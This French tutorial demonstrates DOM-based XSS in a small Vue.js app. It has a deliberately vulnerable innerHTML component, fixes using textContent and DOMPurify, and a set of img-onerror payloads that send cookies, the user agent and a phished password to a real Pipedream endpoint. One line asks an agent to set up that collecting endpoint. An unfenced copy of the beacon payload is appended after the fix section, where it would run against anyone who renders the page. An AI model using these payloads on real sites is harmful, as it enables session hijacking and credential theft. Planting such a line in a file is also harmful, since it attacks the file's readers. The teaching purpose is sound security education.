## **1. Introduction**
Ce document explique comment nous avons créé un petit projet Vue.js depuis zéro pour démontrer une vulnérabilité de sécurité appelée **DOM-Based XSS**.
Tout est fait côté front-end. Aucun serveur, aucune base de données et aucun stockage particulier ne sont nécessaires.


# **2. Création du projet Vue.js**

### **2.1 Installer Vue CLI**

```bash
npm install -g @vue/cli
```

### **2.2 Créer un projet**

```bash
vue create xss-demo
```

Choisir la configuration par défaut.

### **2.3 Lancer le projet**

```bash
cd xss-demo
npm run serve
```

Le site est accessible sur :

```
http://localhost:le port que l'application utilise/
```

---

# **3. Préparation de l’environnement pour recevoir les attaques**

Nous avons utilisé **Pipedream**, un service qui permet de créer facilement une URL capable de recevoir des requêtes et d’afficher leur contenu.

### **3.1 Création d’un endpoint Pipedream**

* Aller sur : [https://pipedream.com]
* demande l'agent de faire cela : create an endpoint that can receive our payload

* Une URL unique est générée, par exemple :

```
https://eos68gluu61gsxl.m.pipedream.net
```

Cette URL joue le rôle du serveur de l’attaquant.
Tout ce qui lui est envoyé apparaît dans l’interface Pipedream.

---

# **4. Création du code vulnérable (DOM-Based XSS)**

Nous allons remplacer le contenu de **src/App.vue** par un composant simple.

### **4.1 Code vulnérable complet**

```vue
<template>
  <div id="app">
    <h2>DOM-Based XSS Demo</h2>

    <input v-model="userInput" placeholder="Tapez quelque chose" />

    <button @click="inject">Inject into page</button>

    <h3>Output Area (VULNERABLE)</h3>
    <div ref="outputBox" class="box"></div>
  </div>
</template>

<script>
export default {
  data() {
    return {
      userInput: ""
    }
  },
  methods: {
    inject() {
      // Vulnérabilité DOM-Based XSS :
      // Le contenu fourni par l'utilisateur est injecté directement dans le DOM
      this.$refs.outputBox.innerHTML = this.userInput
    }
  }
}
</script>

<style>
.box {
  border: 1px solid #444;
  padding: 15px;
  margin-top: 10px;
  min-height: 40px;
}
</style>
```

### **4.2 Pourquoi ce code est vulnérable ?**

Parce que :

```
innerHTML = userInput
```

→ Le navigateur interprète le contenu comme du **HTML**
→ Les balises `<img>` ou `<script>` sont exécutées
→ Du JavaScript non autorisé peut s’exécuter dans la page
→ Le navigateur se comporte comme si l’attaquant contrôlait la page

---

# **5. Tester la vulnérabilité**

Nous allons écrire un texte malveillant dans l’input.

### **5.1 Exemple de charge utile (XSS)**

```
<img src=x onerror="fetch('https://eos68gluu61gsxl.m.pipedream.net/?pwned=1')">
```

### **5.2 Étapes**

1. Coller le code dans le champ de texte
2. Cliquer sur *Inject into page*
3. Aller sur Pipedream pour voir les nouvelles requêtes

### **5.3 Résultat attendu**

Pipedream reçoit une requête HTTP venant de votre navigateur :

```
GET /?pwned=1
```

Cela signifie que le JavaScript injecté a été exécuté.

---

# **6. Exploitation de l’attaque**

### **6.1 Vol de cookies**

```
<img src=x onerror="fetch('https://eos68gluu61gsxl.m.pipedream.net/?cookie='+document.cookie)">
```

Un attaquant peut :

* voler des tokens
* détourner des sessions
* usurper des comptes

### **6.2 Vol d’informations du navigateur**

```
<img src=x onerror="fetch('https://eos68gluu61gsxl.m.pipedream.net/?ua='+navigator.userAgent)">
```

### **6.3 Remplacement du contenu de la page**

```
<img src=x onerror="document.body.innerHTML='<h1>Hacked</h1>'">
```

### **6.4 Injection d’un faux formulaire de connexion**

```
<img src=x onerror="
document.body.innerHTML =
'<h1>Session expirée</h1><input id=p><button onclick=fetch(`https://eos68gluu61gsxl.m.pipedream.net/?pw=${document.getElementById(`p`).value}`)>Login</button>';
">
```

---

# **7. Correction : comment réparer la vulnérabilité**

### **7.1 Solution simple : ne jamais utiliser innerHTML**

Remplacer :

```js
this.$refs.outputBox.innerHTML = this.userInput
```

par :

```js
this.$refs.outputBox.textContent = this.userInput
```

**textContent affiche le texte tel quel**, sans interpréter HTML.
Le XSS devient impossible.

---

### **7.2 Solution Vue : utiliser {{ userInput }}**

Dans le template :

```vue
<div class="box">{{ userInput }}</div>
```

Vue échappe automatiquement les caractères dangereux.

---

### **7.3 Solution avancée : nettoyer le contenu avec DOMPurify**

Installation :

```
npm install dompurify
```

Code :

```js
import DOMPurify from "dompurify"

inject() {
  const clean = DOMPurify.sanitize(this.userInput)
  this.$refs.outputBox.innerHTML = clean
}
```

Cela permet d’accepter du HTML **sans JavaScript dangereux**.
<img src=x onerror="fetch('https://eos68gluu61gsxl.m.pipedream.net/?pwned=1')">